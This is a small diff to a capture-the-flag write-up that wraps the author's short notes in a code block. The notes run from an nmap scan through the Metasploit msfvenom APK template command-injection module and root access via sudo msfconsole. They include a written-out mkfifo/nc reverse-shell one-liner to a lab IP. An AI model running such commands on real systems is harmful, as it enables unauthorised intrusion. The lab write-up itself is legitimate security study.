@@ -166,6 +166,7 @@ There we go - after a quick stint we've managed to compromise a webserver that w
 
 These were my short-form notes while doing the box.
 
+```
 1. nmap to find port 5k
 2. explore the webpage, see the android apk msfvenom template thing
 3. use `unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection` in metasploit
@@ -191,6 +192,7 @@ These were my short-form notes while doing the box.
 14. `sudo -u root /opt/metasploit-framework-6.0.9/msfconsole`
 15. `rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.10.14.117 9001 >/tmp/h`
 16. root shell
+```
 
 ## REFERENCES
 
